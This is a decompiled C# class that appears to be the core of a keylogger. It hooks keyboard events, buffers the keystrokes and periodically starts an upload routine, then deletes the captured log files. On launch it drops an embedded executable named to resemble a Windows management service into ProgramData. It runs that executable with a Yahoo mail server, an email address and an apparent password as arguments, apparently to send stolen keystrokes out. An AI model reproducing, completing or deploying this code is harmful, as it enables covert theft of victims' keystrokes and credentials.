using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

public class GClass6
{
	private Class1 class1_0 = new Class1();

	private GClass9 gclass9_0 = new GClass9();

	private GClass0 gclass0_0 = new GClass0();

	private Timer timer_0 = new Timer();

	private Timer timer_1 = new Timer();

	private Timer timer_2 = new Timer();

	private int int_0;

	private bool bool_0;

	public GClass6()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		method_4();
		class1_0.method_0();
		Class1.Event_2 += method_0;
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_0.set_Interval(3000);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_1.set_Interval(3600000);
		timer_1.Start();
		Application.Run();
	}

	private void method_0(int int_1)
	{
		timer_0.Stop();
		timer_0.Start();
		gclass9_0.method_2(gclass0_0.method_0((Keys)int_1), 3);
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		int_0++;
		if (int_0 >= 300)
		{
			gclass9_0.method_8();
			int_0 = 0;
		}
		gclass9_0.method_3();
		timer_0.Stop();
		method_1();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		bool_0 = true;
	}

	private void method_1()
	{
		if (gclass9_0.method_5() > 10000L || bool_0)
		{
			method_2();
		}
	}

	private void method_2()
	{
		GClass5 gClass = new GClass5(GClass9.String_2);
		if (File.Exists(Path.Combine(GClass9.String_1, GClass9.String_2)) && gClass.method_2())
		{
			gclass9_0.method_9();
			gclass9_0.method_0();
			gClass.Event_0 += method_3;
			try
			{
				Thread thread = new Thread(gClass.method_0);
				thread.Start();
			}
			catch
			{
			}
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		string path = Path.Combine(GClass9.String_1, GClass9.String_2);
		if (!File.Exists(path))
		{
			return;
		}
		string[] files = Directory.GetFiles(Path.GetDirectoryName(path));
		foreach (string text in files)
		{
			if (Path.GetFileName(text)!.ToUpper() != Path.GetFileName(GClass9.String_2)!.ToUpper())
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
					GClass2.smethod_0(text);
				}
			}
		}
		bool_0 = false;
	}

	private void method_4()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "ccmmE.exe");
			if (File.Exists(text))
			{
				GClass2.smethod_4("ccmmE.exe");
				GClass2.smethod_0(text);
			}
			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("mtrl.ccmExec.exe"))
			{
				using FileStream fileStream = new FileStream(text, FileMode.Create);
				byte[] array = new byte[stream.Length];
				stream.Read(array, 0, array.Length);
				fileStream.Write(array, 0, array.Length);
			}
			string arguments = Application.get_ExecutablePath() + " " + Application.get_ProductVersion() + " " + "pop.mail.yahoo.com" + " " + "paradisejohn@rocketmail.com" + " " + "@onn2@onn2";
			Process.Start(text, arguments);
		}
		catch
		{
		}
	}
}
